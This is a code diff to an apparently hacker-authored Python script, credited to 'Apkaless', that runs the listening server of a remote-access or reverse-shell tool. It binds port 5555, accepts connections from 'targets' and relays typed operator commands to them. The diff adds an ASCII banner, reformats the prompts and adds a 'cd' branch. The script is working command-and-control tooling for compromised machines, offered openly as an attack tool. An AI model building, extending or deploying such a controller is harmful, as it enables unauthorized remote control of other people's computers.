@@ -8,7 +8,38 @@ server.bind(("0.0.0.0", 5555))
 
 server.listen()
 
-print('\nServer started and waiting for incoming connection\n')
+print('''
+
+[+]======================================================================[+]
+
+   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx      
+   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+    _______  _______  _        _______  _        _______  _______  _______ 
+   (  ___  )(  ____ )| \    /\(  ___  )( \      (  ____ \(  ____ \(  ____ \'
+   | (   ) || (    )||  \  / /| (   ) || (      | (    \/| (    \/| (    \/
+   | (___) || (____)||  (_/ / | (___) || |      | (__    | (_____ | (_____ 
+   |  ___  ||  _____)|   _ (  |  ___  || |      |  __)   (_____  )(_____  )
+   | (   ) || (      |  ( \ \ | (   ) || |      | (            ) |      ) |
+   | )   ( || )      |  /  \ \| )   ( || (____/\| (____/\/\____) |/\____) |
+   |/     \||/       |_/    \/|/     \|(_______/(_______/\_______)\_______)
+
+   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                                                                                                                                                                   
+   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+[+]======================================================================[+]
+
+[x] Author  : Apkaless
+
+[x] Country : IRAQ
+
+[+] Server Started !
+
+[+] Waiting For Incoming Connection
+
+''')
 
 
 while True:
@@ -17,7 +48,7 @@ while True:
 
         object, address = server.accept() # Accept the connection from the target and return the socket object, ipv4 and port number of the target who connected to our server
 
-        print(f'Incoming Connection From {address[0]}:{address[1]}\n') # address[0] is gonna be the target ipv4 and address[1] is gonna be the port number
+        print(f'[+] Incoming Connection From {address[0]}:{address[1]}\n') # address[0] is gonna be the target ipv4 and address[1] is gonna be the port number
 
     except:
         continue
@@ -26,7 +57,7 @@ while True:
 
         while True:
 
-            cmd = input('Run A Command: ')
+            cmd = input('[Run A Command]: ')
 
             if cmd =='exit':
 
@@ -105,6 +136,9 @@ while True:
 
                 continue
 
+            elif cmd == 'cd':
+                continue
+            
             else:
                 
                 object.send(cmd.encode('ascii'))
